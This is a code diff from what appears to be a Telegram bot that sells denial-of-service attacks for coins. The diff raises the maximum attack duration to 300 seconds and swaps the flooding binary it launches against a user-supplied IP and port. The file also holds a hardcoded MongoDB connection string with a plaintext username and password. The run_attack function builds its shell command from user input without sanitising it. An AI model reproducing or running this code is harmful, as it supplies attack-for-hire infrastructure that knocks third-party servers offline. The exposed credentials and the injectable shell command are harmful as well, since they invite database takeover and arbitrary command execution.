@@ -14,7 +14,7 @@ ADMIN_USER_ID = 5142603617
 MONGO_URI = "mongodb+srv://rmr31098:ranbal123@cluster0.pcbr2.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
 DB_NAME = "rmr31098"
 COLLECTION_NAME = "users"
-ATTACK_TIME_LIMIT = 240  # Maximum attack duration in seconds
+ATTACK_TIME_LIMIT = 300  # Maximum attack duration in seconds
 COINS_REQUIRED_PER_ATTACK = 5  # Coins required for an attack
 
 # MongoDB setup
@@ -172,7 +172,7 @@ async def run_attack(chat_id, ip, port, duration, context):
     attack_in_progress = True
 
     try:
-        command = f"./2111 {ip} {port} {duration}  800"
+        command = f"./bgmi {ip} {port} {duration}  1 1000"
         process = await asyncio.create_subprocess_shell(
             command,
             stdout=asyncio.subprocess.PIPE,
